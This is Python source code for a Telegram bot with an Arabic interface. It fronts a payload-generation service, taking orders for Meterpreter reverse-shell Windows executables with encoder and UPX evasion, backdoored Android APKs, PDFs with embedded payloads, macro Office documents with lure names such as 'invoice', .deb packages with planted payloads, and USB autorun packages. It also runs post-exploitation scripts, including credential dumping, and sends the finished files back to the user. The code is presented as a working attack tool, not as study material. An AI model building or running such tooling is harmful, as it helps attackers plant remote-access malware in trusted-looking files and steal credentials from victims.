import asyncio
import json
import os
import logging
from dataclasses import dataclass
from typing import Dict, Any, Optional

import httpx
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

ORCH_URL = os.environ.get("ORCH_URL", "http://127.0.0.1:8000")
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("TELEGRAM_OWNER_ID", "0"))

MENU, PARAMS = range(2)

@dataclass
class Session:
    kind: Optional[str] = None
    params: Dict[str, str] = None
    task_id: Optional[str] = None
    adv: bool = False


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("/start received from user_id=%s", getattr(update.effective_user, "id", None))
    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
        if update.message:
            await update.message.reply_text("تم رفض الوصول.")
        elif update.callback_query:
            await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
        return ConversationHandler.END
    kb = [
        [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
        [InlineKeyboardButton("EXE متقدم (Windows)", callback_data="kind:winexe")],
        [InlineKeyboardButton("مستمع (Listener)", callback_data="kind:listener")],
        [InlineKeyboardButton("Android APK", callback_data="kind:android")],
        [InlineKeyboardButton("PDF مضمَّن", callback_data="kind:pdf")],
        [InlineKeyboardButton("مستند Office", callback_data="kind:office")],
        [InlineKeyboardButton("حزمة .deb", callback_data="kind:deb")],
        [InlineKeyboardButton("حزمة Autorun", callback_data="kind:autorun")],
        [InlineKeyboardButton("ما بعد الاستغلال", callback_data="kind:postex")],
    ]
    intro = (
        "اختر نوع المهمة:\n"
        "- بايلود ويندوز: توليد ملف EXE يحتوي اتصال عكسي (Meterpreter).\n"
        "- مستمع: تشغيل مستمع لالتقاط الاتصال على LHOST/LPORT.\n"
        "- Android APK: حقن حمولة داخل ملف APK عيّنة وإرساله لك."
    )
    if update.message:
        await update.message.reply_text(intro, reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.callback_query.edit_message_text(intro, reply_markup=InlineKeyboardMarkup(kb))
    context.user_data["session"] = Session(kind=None, params={})
    return MENU


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("pong ✅")


async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("أمر غير معروف. استخدم /start لفتح القائمة.")


async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "back":
        return await start(update, context)
    if not data.startswith("kind:"):
        return MENU
    kind = data.split(":", 1)[1]
    sess: Session = context.user_data.get("session")
    sess.kind = kind
    sess.params = {}
    sess.adv = False
    # Support advanced toggle via explicit kinds where applicable
    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="back")]])
    if kind == "payload":
        txt = (
            "أرسل المعلمات بهذا الشكل: LHOST LPORT OUTPUT_NAME\n"
            "مثال: 192.168.1.10 4444 win_test\n"
            "ملاحظة: سيتم استخدام payload افتراضي windows/meterpreter/reverse_tcp"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "winexe":
        sess.adv = True
        txt = (
            "EXE متقدم (Windows).\n"
            "أرسل: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\n"
            "ARCH: x86 أو x64\n"
            "ENCODERS (اختياري): سلسلة مفصولة بفواصل مثل x86/shikata_ga_nai:5,x86/countdown:3\n"
            "UPX: true أو false\n"
            "مثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "listener":
        txt = (
            "أرسل المعلمات بهذا الشكل: LHOST LPORT\n"
            "مثال شائع: 0.0.0.0 4444 (يستمع على كل الواجهات)\n"
            "يجب أن تطابق القيم المستخدمة في البايلود."
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "android":
        # Offer advanced android by toggling adv flag via simple instruction
        adv_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("إدخال بسيط", callback_data="kind:android_basic"), InlineKeyboardButton("خيارات متقدمة", callback_data="kind:android_adv")],
            [InlineKeyboardButton("⬅️ رجوع", callback_data="back")]
        ])
        await query.edit_message_text("اختر الوضع:", reply_markup=adv_kb)
        return MENU
    elif data == "kind:android_basic":
        sess.kind = "android"
        sess.adv = False
        await query.edit_message_text(
            "أرسل: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444",
            reply_markup=back_kb
        )
        return PARAMS
    elif data == "kind:android_adv":
        sess.kind = "android"
        sess.adv = True
        txt = (
            "Android متقدم.\n"
            "أرسل: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]\n"
            "MODE: backdoor_apk أو standalone\n"
            "PERM: keep أو merge\n"
            "مثال بدون توقيع: backdoor_apk keep 10.0.2.2 4444 myapp\n"
            "مثال مع توقيع: backdoor_apk keep 10.0.2.2 4444 myapp /path/ks.jks:myalias:store:pass"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
        return PARAMS
    elif kind == "pdf":
        # Offer advanced base pdf
        sess.adv = True
        txt = (
            "PDF مضمَّن.\n"
            "أرسل: LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]\n"
            "مثال: 127.0.0.1 4444 report /workspace/PE/original.pdf"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "office":
        txt = (
            "توليد مستند ماكرو.\n"
            "أرسل: TARGET LHOST LPORT OUTPUT_NAME\n"
            "TARGET أحد: ms_word_windows | ms_word_mac | openoffice_windows | openoffice_linux\n"
            "مثال: ms_word_windows 127.0.0.1 4444 invoice\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "deb":
        txt = (
            "تلغيم حزمة .deb.\n"
            "أرسل: DEB_PATH LHOST LPORT OUTPUT_NAME\n"
            "مثال: /path/app.deb 127.0.0.1 4444 mydeb\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "autorun":
        txt = (
            "حزمة Autorun لوسائط USB/CD.\n"
            "أرسل: [EXE_PATH] [EXE_NAME]\n"
            "مثال مع ملفك: /path/payload.exe myapp.exe\n"
            "أو ارسل سطر فارغ لاستخدام الملف الافتراضي app4.\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    elif kind == "postex":
        txt = (
            "تشغيل سكربت ما بعد الاستغلال (rc) عبر msfconsole.\n"
            "أرسل: SCRIPT_NAME [SESSION_ID]\n"
            "أمثلة السكربتات المتوفرة: sysinfo.rc, fast_migrate.rc, cred_dump.rc, gather.rc\n"
            "مثال: sysinfo.rc 1\n"
        )
        await query.edit_message_text(txt, reply_markup=back_kb)
    else:
        await query.edit_message_text("خيار غير مدعوم")
        return ConversationHandler.END
    return PARAMS


async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sess: Session = context.user_data.get("session")
    if not sess or not sess.kind:
        await update.message.reply_text("لا توجد جلسة نشطة. استخدم /start")
        return ConversationHandler.END
    parts = update.message.text.strip().split()
    if sess.kind == "payload":
        if len(parts) < 3:
            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME\nمثال: 192.168.1.10 4444 win_test")
            return PARAMS
        lhost, lport, output_name = parts[:3]
        payload = "windows/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
    elif sess.kind == "winexe":
        # advanced windows exe
        if len(parts) < 6:
            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\nمثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true")
            return PARAMS
        lhost, lport, output_name, arch, encoders, upx = parts[:6]
        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "arch": arch, "encoders": encoders, "upx": upx, "payload": "windows/meterpreter/reverse_tcp"}
    elif sess.kind == "listener":
        if len(parts) < 2:
            await update.message.reply_text("الاستخدام: LHOST LPORT\nمثال: 0.0.0.0 4444")
            return PARAMS
        lhost, lport = parts[:2]
        payload = "windows/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    elif sess.kind == "android" and not sess.adv:
        if len(parts) < 2:
            await update.message.reply_text("الاستخدام: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444")
            return PARAMS
        lhost, lport = parts[:2]
        payload = "android/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    elif sess.kind == "android" and sess.adv:
        if len(parts) < 4:
            await update.message.reply_text("الاستخدام: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]")
            return PARAMS
        mode, perm, lhost, lport = parts[:4]
        output_name = parts[4] if len(parts) >= 5 else "app_backdoor"
        ks_block = parts[5] if len(parts) >= 6 else ""
        sess.params = {"mode": mode, "perm_strategy": perm, "lhost": lhost, "lport": lport, "output_name": output_name, "payload": "android/meterpreter/reverse_tcp"}
        if ks_block:
            try:
                ks_path, alias, storepass, keypass = ks_block.split(":", 3)
                sess.params.update({"keystore_path": ks_path, "key_alias": alias, "keystore_password": storepass, "key_password": keypass})
            except Exception:
                await update.message.reply_text("صيغة التوقيع غير صحيحة. استخدم: /path/ks.jks:alias:storepass:keypass")
                return PARAMS
    elif sess.kind == "pdf":
        lhost = parts[0] if len(parts) >= 1 else ""
        lport = parts[1] if len(parts) >= 2 else ""
        output_name = parts[2] if len(parts) >= 3 else "document"
        base_pdf = parts[3] if len(parts) >= 4 else ""
        if not lhost or not lport:
            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]")
            return PARAMS
        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": "windows/meterpreter/reverse_tcp"}
        if base_pdf:
            sess.params["base_pdf_path"] = base_pdf
    elif sess.kind == "office":
        if len(parts) < 4:
            await update.message.reply_text("الاستخدام: TARGET LHOST LPORT OUTPUT_NAME\nمثال: ms_word_windows 127.0.0.1 4444 invoice")
            return PARAMS
        target, lhost, lport, output_name = parts[:4]
        valid = {"ms_word_windows","ms_word_mac","openoffice_windows","openoffice_linux"}
        if target not in valid:
            await update.message.reply_text("TARGET غير صحيح. استخدم: ms_word_windows | ms_word_mac | openoffice_windows | openoffice_linux")
            return PARAMS
        payload = "windows/meterpreter/reverse_tcp"
        sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
    elif sess.kind == "deb":
        if len(parts) < 4:
            await update.message.reply_text("الاستخدام: DEB_PATH LHOST LPORT OUTPUT_NAME\nمثال: /path/app.deb 127.0.0.1 4444 mydeb")
            return PARAMS
        deb_path, lhost, lport, output_name = parts[:4]
        sess.params = {"deb_path": deb_path, "lhost": lhost, "lport": lport, "output_name": output_name}
    elif sess.kind == "autorun":
        exe_path = parts[0] if len(parts) >= 1 else ""
        exe_name = parts[1] if len(parts) >= 2 else "app4.exe"
        sess.params = {"exe_path": exe_path, "exe_name": exe_name}
    elif sess.kind == "postex":
        if len(parts) < 1:
            await update.message.reply_text("الاستخدام: SCRIPT_NAME [SESSION_ID]\nأمثلة: sysinfo.rc أو sysinfo.rc 1")
            return PARAMS
        script_name = parts[0]
        session_id = parts[1] if len(parts) >= 2 else ""
        sess.params = {"script_name": script_name}
        if session_id:
            sess.params["session_id"] = session_id
    else:
        await update.message.reply_text("خيار غير مدعوم")
        return ConversationHandler.END

    # create task
    async with httpx.AsyncClient(timeout=600) as client:
        resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": sess.kind, "params": sess.params})
        resp.raise_for_status()
        data = resp.json()
        task = data["task"]
        sess.task_id = task["id"]
    await update.message.reply_text(f"تم إنشاء المهمة: {sess.task_id}\nسيتم تتبع التقدم وإرسال الملفات عند الانتهاء…")
    await poll_and_send(update, context, sess)
    return ConversationHandler.END


async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess: Session):
    chat_id = update.effective_chat.id
    async with httpx.AsyncClient(timeout=600) as client:
        for _ in range(60):
            r = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}")
            r.raise_for_status()
            task = r.json()["task"]
            state = task["state"]
            state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
            await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
            if state in ("SUCCEEDED", "FAILED", "CANCELLED"):
                if state == "SUCCEEDED":
                    arts = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}/artifacts")
                    arts.raise_for_status()
                    artifacts = arts.json()
                    if artifacts:
                        for a in artifacts:
                            p = a["path"]
                            name = a["name"]
                            try:
                                with open(p, "rb") as f:
                                    await context.bot.send_document(chat_id, document=InputFile(f, filename=name), caption="الملف الناتج")
                            except Exception as e:
                                await context.bot.send_message(chat_id, f"تعذّر إرسال {name}: {e}")
                else:
                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state_ar}\nالخطأ: {task.get('error')}")
                return
            await asyncio.sleep(2)
    await context.bot.send_message(chat_id, "انتهت مهلة الانتظار دون إكمال المهمة")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("تم رفض الوصول.")
        return
    if not context.args:
        await update.message.reply_text("الاستخدام: /cancel <task_id>")
        return
    task_id = context.args[0]
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.post(f"{ORCH_URL}/tasks/{task_id}/cancel")
        if r.status_code == 200:
            await update.message.reply_text(f"تم إلغاء المهمة: {task_id}")
        else:
            await update.message.reply_text(f"تعذّر الإلغاء: {r.text}")


def main():
    token = BOT_TOKEN
    if not token:
        print("Please set TELEGRAM_BOT_TOKEN in environment.")
        return
    application = Application.builder().token(token).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("menu", start)],
        states={
            MENU: [CallbackQueryHandler(menu_handler)],
            PARAMS: [
                MessageHandler(filters.TEXT & (~filters.COMMAND), params_handler),
                CommandHandler("start", start),
                CommandHandler("menu", start),
                CallbackQueryHandler(menu_handler),
            ],
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("menu", start)],
        per_message=False,
        per_user=True,
        per_chat=True,
    )
    application.add_handler(conv)
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(MessageHandler(filters.COMMAND, unknown))
    logger.info("Starting polling...")
    try:
        application.run_polling(allowed_updates=("message","callback_query"), drop_pending_updates=True)
    except Exception as e:
        logger.exception("Bot crashed: %s", e)


if __name__ == "__main__":
    main()